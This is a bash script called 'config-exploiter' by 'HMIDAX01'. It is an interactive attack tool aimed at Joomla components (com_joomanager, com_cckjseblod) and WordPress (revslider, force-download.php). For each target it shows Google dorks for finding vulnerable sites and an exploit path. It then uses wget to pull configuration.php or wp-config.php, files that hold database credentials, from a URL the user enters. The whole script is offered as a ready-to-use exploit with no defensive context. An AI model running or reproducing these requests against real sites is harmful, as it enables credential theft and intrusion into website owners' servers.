#!/bin/bash
#Colors
n="1"
n2="2"
n3="3"
n99="99"
h="HTTPS"
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
redback=" \e[41m"
greenback="\e[42m"
nc="\e[0m"
#Banner
clear
echo -e "$Cyan  ___   __   __ _  ____   __    ___  $nc"
echo -e "$Cyan / __) /  \ (  ( \(  __) (  )  / __) $nc"
echo -e "$Cyan( (__ (  O )/    / ) _)   )(  ( (_ \ $nc"
echo -e "$Cyan \___) \__/ \_)__)(__)   (__)  \___/ $nc"
echo -e "$Cyan 	            ____  _  _  ____  __     __    __   ____  ____  ____  $nc"
echo -e "$Cyan 		   (  __)( \/ )(  _ \(  )   /  \  (  ) (_  _)(  __)(  _ \ $nc"
echo -e "$Cyan  	  	    ) _)  )  (  ) __// (_/\(  O )  )(    )(   ) _)  )   / $nc"
echo -e "$Cyan		   (____)(_/\_)(__)  \____/ \__/  (__)  (__) (____)(__\_) $nc"
echo ""
echo ""
echo -e "					$Cafe┌─────────────────────────────────┐$nc"
echo -e "					$Cafe│$nc$green Programmed By $nc:$red HMIDAX01$Cafe│$nc"
echo -e "					$Cafe└─────────────────────────────────┘$nc"
echo ""
echo ""
echo -e "	 $red[$green$n$red] $nc  =Jommla config file Download vulnerability= "
echo -e "	 $red[$green$n2$red]$nc   =Wordpress config file Download vulnerability= "
echo -e "  	 $red[$green$n99$red]$nc  =Exit= "
echo ""
read -p "$(echo -e $red[$nc$green+$nc$red]$nc) Enter Your Choice : " ch
if [ $ch = "1" ]; then
echo ""
echo -e "	 $red[$green$n$red]$nc  com_joomanager"
echo -e "	 $red[$green$n2$red]$nc  com_cckjseblod"
echo -e "	 $red[$green$n3$red]$nc  Back To Main Menu"
echo -e "	 $red[$green$n99$red]$nc Exit"
echo ""
read -p "$(echo -e $red[$nc$green+$nc$red]$nc) Enter Your Choice : " ch2
if [ $ch2 = "1" ]; then
#com_joomanager
clear
echo -e "	$Cafe┌───────────────────────────────────────────────────────┐$nc"
echo -e "	$Cafe│$nc$Cyan _________ _______  _______  _______  _        _______ $Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan \__    _/(  ___  )(  ___  )(       )( \      (  ___  )$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan    )  (  | (   ) || (   ) || () () || (      | (   ) |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan    |  |  | |   | || |   | || || || || |      | (___) |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan    |  |  | |   | || |   | || |(_)| || |      |  ___  |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan    |  |  | |   | || |   | || |   | || |      | (   ) |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan |\_)  )  | (___) || (___) || )   ( || (____/\| )   ( |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan (____/   (_______)(_______)|/     \|(_______/|/     \|$Cafe│$nc"                                                      
echo -e "	$Cafe└───────────────────────────────────────────────────────┘$nc"
                            ḦṂÏĎÄẌ01
echo -e "	$Cafe┌──────────────────────────────────────────────────────────┐"
echo -e "	$Cafe│$nc$green Exploit Title$nc	:$red Joomla Config File Download Vulnerability$nc$Cafe│$nc"
echo -e "	$Cafe│$nc$green We Are$nc 	:$red HMIDAX01-Joomla$nc			   $Cafe│$nc"
echo -e "	$Cafe│$nc$green Tested on$nc 	:$red Backbox linux-wifislax-parootsecurity$nc				   $Cafe│$nc"
echo -e "	$Cafe│──────────────────────────────────────────────────────────$Cafe│$nc"
echo -e "	$Cafe│$nc$green  Dork$nc	 	:$red inurl:'index.php?option=com_joomanager'$nc  $Cafe│$nc"
echo -e "	$Cafe│─────────────────────────────────────────────────────────────────────────────────────────────────────────┐"
echo -e "	$Cafe│$nc$green Exploit$nc 	:$red /index.php?option=com_joomanager&controller=details&task=download&path=configuration.php$nc$Cafe│$nc"
echo -e "	$Cafe│─────────────────────────────────────────────────────────────────────────────────────────────────────────┘"
echo -e "	$Cafe│$nc$green Coded By$nc 	: $red hmidax01$nc                        $Cafe│$nc"
echo -e "	$Cafe└──────────────────────────────────────────────────────────┘"
read -p "		$(echo -e $red[$nc$green+$nc$red]$nc) Enter Target URL $(echo -e $red[$nc without$green HTTP$nc/$green$h$red ]$nc) : " urlq
if [ $urlq -ne ]; then
echo -e "		$red[$green+$nc$red]$nc$redback 404 Not Found, Exit$nc"
else
wget "$urlq/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php" -O $urlq
echo -e "		$red[$green+$nc$red]$nc$redback Config File Saved As ($urlq)$nc"
fi
elif [ $ch2 = "2" ]; then
#com_cckjseblod
clear
echo -e "	$Cafe┌───────────────────────────────────────────────────────┐$nc"
echo -e "	$Cafe│$nc$Cyan _________ _______  _______  _______  _        _______ $Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan \__    _/(  ___  )(  ___  )(       )( \      (  ___  )$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan    )  (  | (   ) || (   ) || () () || (      | (   ) |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan    |  |  | |   | || |   | || || || || |      | (___) |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan    |  |  | |   | || |   | || |(_)| || |      |  ___  |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan    |  |  | |   | || |   | || |   | || |      | (   ) |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan |\_)  )  | (___) || (___) || )   ( || (____/\| )   ( |$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan (____/   (_______)(_______)|/     \|(_______/|/     \|$Cafe│$nc"                                                      
echo -e "	$Cafe└───────────────────────────────────────────────────────┘$nc"
echo -e "	$Cafe┌──────────────────────────────────────────────────────────┐"
echo -e "	$Cafe│$nc$green Exploit Title$nc	:$red Joomla Config File Download Vulnerability$nc$Cafe│$nc"
echo -e "	$Cafe│$nc$green Tested on$nc 	:$red Backbox linux$nc				   $Cafe│$nc"
echo -e "	$Cafe│──────────────────────────────────────────────────────────$Cafe│$nc"
echo -e "	$Cafe│$nc$green Dork$nc 		:$red inurl:option=com_cckjseblod$nc	           $Cafe│$nc"
echo -e "	$Cafe│──────────────────────────────────────────────────────────────────────────────────────┐"
echo -e "	$Cafe│$nc$green Exploit$nc 	:$red /index.php?option=com_cckjseblod&task=download&file=configuration.php$nc$Cafe│$nc"
echo -e "	$Cafe│──────────────────────────────────────────────────────────────────────────────────────┘"
echo -e "	$Cafe│$nc$green Coded By$nc 	: $red hmidax01$nc                        $Cafe│$nc"
echo -e "	$Cafe│──────────────────────────────────────────────────────────│"
echo -e "	$Cafe│$nc$green Contact $nc 	:$red  fb:احمد الفقير          	   $Cafe│$nc"
echo -e "	$Cafe└──────────────────────────────────────────────────────────$Cafe┘$nc"
read -p "		$(echo -e $red[$nc$green+$nc$red]$nc) Enter Target URL $(echo -e $red[$nc without$green HTTP$nc/$green$h$red ]$nc) : " url
if [ $url -ne ]; then
echo -e "		$red[$green+$nc$red]$nc$redback 404 Not Found, Exit$nc"
else
wget "$url/index.php?option=com_cckjseblod&task=download&file=configuration.php" -O $url
echo -e "		$red[$green+$nc$red]$nc$redback Config File Saved As ($url)$nc"
fi
elif [ $ch2 = "3" ]; then
clear
bash config-exploiter.sh
elif [ $ch2 = "99" ]; then
echo ""
echo -e "		$red[$green-$red]$nc$yellow Exit $nc. "
echo ""
exit 1
fi
elif [ $ch = 2 ]; then
echo ""
echo -e "	 $red[$green$n$red]$nc  revslider"
echo -e "	 $red[$green$n2$red]$nc  Force File Download"
echo -e "	 $red[$green$n3$red]$nc  Back To Main Menu"
echo -e "	 $red[$green$n99$red]$nc Exit"
echo ""
read -p "$(echo -e $red[$nc$green+$nc$red]$nc) Enter Your Choice : " ch3
if [ $ch3 = "1" ]; then
#reslvider
clear
echo -e "	$Cafe┌──────────────────────────────────────────────────────────────────────────────────┐"
echo -e "	$Cafe│$nc$Cyan          _______  _______  ______   _______  _______  _______  _______  _______  $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan|\     /|(  ___  )(  ____ )(  __  \ (  ____ )(  ____ )(  ____ \(  ____ \(  ____ \ $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| )   ( || (   ) || (    )|| (  \  )| (    )|| (    )|| (    \/| (    \/| (    \/ $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| | _ | || |   | || (____)|| |   ) || (____)|| (____)|| (__    | (_____ | (_____  $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| |( )| || |   | ||     __)| |   | ||  _____)|     __)|  __)   (_____  )(_____  ) $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| || || || |   | || (\ (   | |   ) || (      | (\ (   | (            ) |      ) | $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| () () || (___) || ) \ \__| (__/  )| )      | ) \ \__| (____/\/\____) |/\____) | $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan(_______)(_______)|/   \__/(______/ |/       |/   \__/(_______/\_______)\_______) $nc$Cafe│$nc"
echo -e "	$Cafe└──────────────────────────────────────────────────────────────────────────────────┘$nc"                                                                                 
echo -e "	$Cafe┌────────────────────────────────────────────────────────────────┐"
echo -e "	$Cafe│$nc$green Exploit Title$nc	:$red =WordPress Arbitrary File Download vulnerability$Cafe=│$nc"
echo -e "	$Cafe│$nc$green We Are$nc 	:$red 	hmidax01	   	 $Cafe│$nc"
echo -e "	$Cafe│$nc$green Tested on$nc 	:$red Backbox linux-wifislax-parootsecurity$nc				   	 $Cafe│$nc"
echo -e "	$Cafe│────────────────────────────────────────────────────────────────$Cafe│$nc"
echo -e "	$Cafe│$nc$green Dork$nc 		:$red inurl:/wp-content/plugins/revslider/           $Cafe│$nc"
echo -e "	$Cafe│$nc$green Dork$nc 		:$red revslider.php 'index of			 $Cafe│$nc"
echo -e "	$Cafe│──────────────────────────────────────────────────────────────────────────────────────┐"
echo -e "	$Cafe│$nc$green Exploit$nc 	:$red /admin-ajax.php?action=revslider_show_image&img=../wp-config.php     $Cafe│$nc"
echo -e "	$Cafe│──────────────────────────────────────────────────────────────────────────────────────┘"
echo -e "	$Cafe│$nc$green Coded By$nc 	:$red  hmidax01                       	 $Cafe│$nc"
echo -e "	$Cafe│────────────────────────────────────────────────────────────────│$nc"
echo -e "	$Cafe│$nc$green Contact $nc 	:$red  fb:احمدالفقير                	 $Cafe│$nc"
echo -e "	$Cafe└────────────────────────────────────────────────────────────────$Cafe┘$nc"

read -p "		$(echo -e $red[$nc$green+$nc$red]$nc) Enter Target URL $(echo -e $red[$nc without$green HTTP$nc/$green$h$red ]$nc) : " urla
if [ $urla -ne ]; then
echo -e "		$red[$green+$nc$red]$nc$redback 404 Not Found, Exit$nc"
else
wget "$urla/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php" -O $urla
echo -e "		$red[$green+$nc$red]$nc$redback Config File Saved As $urla$nc"
fi
elif [ $ch3 = "2" ]; then
#"exploit 2
clear
echo -e "	$Cafe┌──────────────────────────────────────────────────────────────────────────────────┐"
echo -e "	$Cafe│$nc$Cyan          _______  _______  ______   _______  _______  _______  _______  _______  $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan|\     /|(  ___  )(  ____ )(  __  \ (  ____ )(  ____ )(  ____ \(  ____ \(  ____ \ $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| )   ( || (   ) || (    )|| (  \  )| (    )|| (    )|| (    \/| (    \/| (    \/ $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| | _ | || |   | || (____)|| |   ) || (____)|| (____)|| (__    | (_____ | (_____  $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| |( )| || |   | ||     __)| |   | ||  _____)|     __)|  __)   (_____  )(_____  ) $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| || || || |   | || (\ (   | |   ) || (      | (\ (   | (            ) |      ) | $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan| () () || (___) || ) \ \__| (__/  )| )      | ) \ \__| (____/\/\____) |/\____) | $nc$Cafe│$nc"
echo -e "	$Cafe│$nc$Cyan(_______)(_______)|/   \__/(______/ |/       |/   \__/(_______/\_______)\_______) $nc$Cafe│$nc"
echo -e "	$Cafe└──────────────────────────────────────────────────────────────────────────────────┘$nc"                                                                                 
echo -e "	$Cafe┌────────────────────────────────────────────────────────────────┐"
echo -e "	$Cafe│$nc$green Exploit Title$nc	:$red =WordPress force File Download vulnerability=	 $Cafe│$nc"
echo -e "	$Cafe│$nc$green Tested on$nc 	:$red Backbox linux				   	 $Cafe│$nc"
echo -e "	$Cafe│────────────────────────────────────────────────────────────────$Cafe│$nc"
echo -e "	$Cafe│$nc$green Dork$nc 		:$red inurl:force-download.php?file=wp-content/uploads$Cafe────────┐$nc"
echo -e "	$Cafe│$nc$green Dork$nc 		:$red inurl:wp-content/uploads inurl:force-download.php?file= $Cafe│$nc"
echo -e "	$Cafe│─────────────────────────────────────────────────────────────────────────┘────────────┐"
echo -e "	$Cafe│$nc$green Exploit$nc 	:$red /force-download.php?file=wp-config.php			       $Cafe│$nc"
echo -e "	$Cafe│──────────────────────────────────────────────────────────────────────────────────────┘"
echo -e "	$Cafe│$nc$green Coded By$nc 	:$red     hmidax01                    	 $Cafe│$nc"
echo -e "	$Cafe│────────────────────────────────────────────────────────────────│$nc"
echo -e "	$Cafe│$nc$green Contact $nc 	:$red  fb:احمدالفقير                	 $Cafe│$nc"
echo -e "	$Cafe└────────────────────────────────────────────────────────────────$Cafe┘$nc"
read -p "		$(echo -e $red[$nc$green+$nc$red]$nc) Enter Target URL $(echo -e $red[$nc without$green HTTP$nc/$green$h$red ]$nc) : " urld
if [ $urld -ne ]; then
echo -e "		$red[$green+$nc$red]$nc$redback 404 Not Found, Exit$nc"
else
wget "$urld/force-download.php?file=wp-config.php" -O $urld
echo -e "		$red[$green+$nc$red]$nc$redback Config File Saved As $urla$nc"
fi
elif [ $ch3 = "3" ]; then
clear
bash config-exploiter.sh
elif [ $ch3 = "99" ]; then
echo ""
echo -e "		$red[$green-$red]$nc$yellow Exit $nc. "
echo ""
exit 1
fi
elif [ $ch = "99" ]; then
echo ""
echo -e "		$red[$green-$red]$nc$yellow Exit $nc. "
echo ""
exit 1
fi
